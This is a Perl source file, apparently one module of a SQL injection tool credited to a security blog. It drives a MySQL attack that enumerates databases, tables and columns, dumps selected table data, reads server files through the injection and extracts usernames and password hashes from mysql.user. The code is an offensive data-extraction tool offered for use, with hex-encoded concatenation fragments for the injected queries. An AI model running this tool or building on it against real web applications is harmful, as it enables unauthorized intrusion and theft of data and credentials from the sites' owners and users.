#!/usr/local/bin/perl

#-----------------------------------------------------------------------------------------#
# Injection tool by Voixsec.blogspot.com
# Code version: 2.1
# Function file: Get about by web, Get tables&columns, Dump data (Regular injection)
#-----------------------------------------------------------------------------------------#

require "MySQL/injector_tool.pl";

sub regular_MySQL()
{
	$user_choice = &regular_MySQL_getVerb();
	
	while($user_choice != 0)
	{
		if($user_choice == 1)
		{
			$printer .= "\nDatabases:\n";
			&generalPrint($printer,1);
			
			$dataname = &regular_MySQL_tables_short("schema_name", "schemata", "");
			if(!($dataname eq ""))
			{
				$printer .= $dataname."\n";
				&generalPrint($printer,1);
			}
			else
			{
				$printer .= "\n";
				
				$db_num = 0;
				$dataname = &regular_MySQL_databases();

				while(!($dataname eq ""))
				{
					$printer .= "   *".$dataname."\n";
					&generalPrint($printer,1);
				
					$db_num++;
					$dataname = &regular_MySQL_databases();
				}
			}	
			&generalPrint($printer,1);
		}
		elsif($user_choice == 2)
		{
			print "\nGet the tables for(DB Name): ";
			chomp($database_select = <STDIN>);
						
			$hex_name = &ascii2hex($database_select);
			$table_attack = $database_select;
			
			$printer .= "\n\nDB Name: ".$database_select."\n";
			&generalPrint($printer,1);
			
			$tablenameF = &regular_MySQL_tables_short("table_name", "tables", "table_schema");
			if(!($tablenameF eq ""))
			{
				$printer .= $tablenameF."\n";
				&generalPrint($printer,1);
			}
			else
			{
				$printer .= "\n";
				
				$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,table_name,0x3b7068656c313b)))";
				$table_num = 0;
				$tablenameF = &regular_MySQL_abo($table_num,"tables","table_schema");
				
				while(!($tablenameF eq ""))
				{
					$printer .= "   *".$tablenameF."\n";
					&generalPrint($printer,1);
				
					$table_num++;
					$tablenameF = &regular_MySQL_abo($table_num,"tables","table_schema");
				}
			}
		}
		elsif($user_choice == 3)
		{
			print "\nGet the columns for(Table Name): ";
			
			$table_attack = "";
			chomp($table_attack = <STDIN>);
			
			$table_select = $table_attack;
			
			$hex_name = &ascii2hex($table_attack);
			
			$printer .= "\n\nTable Name: ".$database_select.".".$table_select."\n";
			&generalPrint($printer,1);
			
			$columnNameF = &regular_MySQL_tables_short("column_name", "columns", "table_name");
			if(!($columnNameF eq ""))
			{
				$printer .= $columnNameF."\n";
				&generalPrint($printer,1);
			}
			else
			{
				$printer .= "\n";
				
				$column_num = 0;
				$total_co   = 0;
				$concat = "UNHEX(HEX(CONCAT(0x3b7068656c313b,column_name,0x3b7068656c313b)))";
				$columnNameF = &regular_MySQL_abo($column_num,"columns","table_name");

				while(!($columnNameF eq ""))
				{
					$printer .= "   *".$columnNameF."\n";
					&generalPrint($printer,1);
				
					$column_num++;
					$total_co++;
					$columnNameF = &regular_MySQL_abo($column_num,"columns","table_name");
				}
			}
		}
		elsif($user_choice == 4)
		{
			$dump_forPrint = "";
			@dumps = ();
			
			print "\n\nHow many columns to dump?: ";
			chomp($dumpN = <STDIN>);
			
			while(!($dumpN =~ /^\d$/) || $dumpN > $total_co)
			{
				print "\nInvalid choice!\nHow many columns to dump?: ";
				chomp($dumpN = <STDIN>);
				
			}
			
			print "\n";
			
			for($i = 0; $i < $dumpN; $i++)
			{
				print "Column".$i." name: ";
				chomp($column_nameD = <STDIN>);
				$dumps[@dumps] = $column_nameD;
			}
			
			print "\n\nAdd WHERE condition?(y/n) ";
			chomp($wc_answ = <STDIN>);
			
			if($wc_answ eq 'y')
			{
				print "The WHERE condition: ";
				chomp($where_condition = <STDIN>);
				
				$dump_forPrint = "\nWHERE condition: ".$where_condition;
				$printer      .= "\nWHERE condition: ".$where_condition;
				
				print "\n";
			}
			else
			{
				$where_condition = "";
			}
			
			print "\nHow many times dump(**=All table)?: ";
			chomp($dumpT = <STDIN>);
			
			$dump_concat = "";
			
			for($i = 0; $i < @dumps; $i++)
			{
				if($i != 0) 
				{
					$dump_concat .= ",0x3b,";
				}
				$dump_concat .= $dumps[$i];
			}
			if($abous[1] eq $database_select)
			{
				$table_injection = $table_select;
			}
			else
			{
				$table_injection = $database_select.".".$table_select;
			}
			$dump_concat_short = $dump_concat;
			$dump_concat_short =~ s/\,0x3a//g;
				
			$printer       .= "\nDump data(".$table_injection.",".$dumpT.")(".$dump_concat_short."): \n\n";
			$dump_forPrint .= "\nDump data(".$table_injection.",".$dumpT.")(".$dump_concat_short."): \n\n";
						
			&generalPrint($printer,1);
			
			if($dumpT eq '**')
			{
				$dump_num = 0; 
				$dump_co  = &regular_MySQL_dumpData();
				
				while(!($dump_co eq ""))
				{
					$printer       .= $dump_co."\n";
					$dump_forPrint .= $dump_co."\n";
					&generalPrint($printer,1);
					
					$dump_num++;
					$dump_co  = &regular_MySQL_dumpData();
				}
			}
			else
			{
				for($dump_num = 0; $dump_num < $dumpT; $dump_num++)
				{
					$dump_co = &regular_MySQL_dumpData();
					if(!($dump_co eq ""))
					{
						$printer       .= $dump_co."\n";
						$dump_forPrint .= $dump_co."\n";

						&generalPrint($printer,1);
					}	
				}
			}
			
			print "Do you want to save this dump(y/n)? ";
			
			chomp($sd_answ = <STDIN>);
			
			if($sd_answ eq 'y')
			{
				&saveInFile(1, $dump_forPrint);
			}
		}
		elsif($user_choice == 5)
		{
			print "\nFile: ";
			
			$file_name = "";
			chomp($file_name = <STDIN>);
			
			$load_fileC = regular_MySQL_loadFile($file_name);
			if($load_fileC eq "0x50723078592048656c706572")
			{
				$printer .= "\n\nCannot load file(".$file_name.")";
			}
			else
			{
				$printer .= "\n\nContent Load file(".$file_name."):\n\n".$load_fileC;
			}
			&generalPrint($printer,1);
		}
		elsif($user_choice == 6)
		{
			print "\nMySQL.user, Limit: ";
			chomp($muser = <STDIN>);
			
			$dump_num        = $muser;
			@dumps           = ("User", "Password");
			$dump_concat     = "User,0x3b,Password";
			$table_injection = "mysql.user";
			$dump_co = &regular_MySQL_dumpData();
			
			if(!($dump_co eq ""))
			{
				$printer .= "\n\nMySql.user result(Limit ".$muser."):\n\n".$dump_co."\n";
				&generalPrint($printer,1);
			}
			else
			{
				$printer .= "\nCannot dumpted about from MySQL.user";
				&generalPrint($printer,1);
			}
		}
		elsif($user_choice == 7)
		{
			&saveInFile(0, $printer);
		}
		
		$user_choice = &regular_MySQL_getVerb();
	}
	
}
